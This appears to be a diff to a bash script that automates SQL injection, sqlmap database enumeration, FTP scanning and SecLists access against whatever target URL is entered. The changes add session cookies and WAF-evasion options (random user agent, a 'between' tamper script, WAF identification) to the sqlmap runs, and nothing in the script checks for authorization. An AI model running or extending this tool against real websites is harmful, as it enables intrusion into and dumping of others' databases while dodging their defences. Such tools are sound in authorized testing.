@@ -133,6 +133,9 @@ perform_sql_injection() {
 perform_sqlmap_scan() {
     local target_url="$1"
     local results_dir="$2"
+    local cookies
+    read -p "Enter the cookies (if any): " cookies
+    
     local commands=(
         "--dbs"
         "--tables"
@@ -155,7 +158,11 @@ perform_sqlmap_scan() {
     local file_count=1
     for command in "${commands[@]}"; do
         local result
-        result=$(run_command sqlmap -u "$target_url" $command)
+        if [ -z "$cookies" ]; then
+            result=$(run_command sqlmap -u "$target_url" $command --random-agent --tamper=between --identify-waf)
+        else
+            result=$(run_command sqlmap -u "$target_url" --cookie="$cookies" $command --random-agent --tamper=between --identify-waf)
+        fi
         local output_file="$results_dir/sqlmap_scan_${file_count}.txt"
         save_to_file "$output_file" "$result"
         echo "Saved SQLmap scan results to $output_file"
@@ -183,23 +190,41 @@ access_seclists() {
 
 # Main function to orchestrate the security scans
 main() {
-    local target_url
-    local results_dir
+    install_tools
+    
+    # Clear the screen and print the header
+    clear_screen
+    print_header
+    
+    # Check if the website is accessible
     read -p "Enter the target URL: " target_url
-    read -p "Enter the results directory: " results_dir
-
-    if [ ! -d "$results_dir" ]; then
-        mkdir -p "$results_dir"
+    if ! check_website_status "$target_url"; then
+        echo "Exiting script. Please ensure the website is accessible and try again."
+        exit 1
     fi
-
-    if check_website_status "$target_url"; then
-        perform_sql_injection "$target_url" "$results_dir"
-        perform_ftp_scan "$target_url" "$results_dir"
-        perform_sqlmap_scan "$target_url" "$results_dir"
-        access_seclists
-    else
-        echo "The website is not accessible. Exiting..."
-    fi
+    
+    # Create a directory to save results
+    local results_dir="scan_results"
+    mkdir -p "$results_dir"
+    
+    # Perform SQL Injection
+    echo "Performing SQL Injection..."
+    perform_sql_injection "$target_url" "$results_dir"
+    
+    # Perform SQLmap scan
+    echo "Performing SQLmap scan..."
+    perform_sqlmap_scan "$target_url" "$results_dir"
+    
+    # Perform FTP scan
+    echo "Performing FTP scan..."
+    perform_ftp_scan "$target_url" "$results_dir"
+    
+    # Access Seclists database
+        # Access Seclists database
+    echo "Accessing Seclists database..."
+    access_seclists
+    
+    echo "Security scans completed. Results have been saved in the $results_dir directory."
 }
 
 # Run the main function
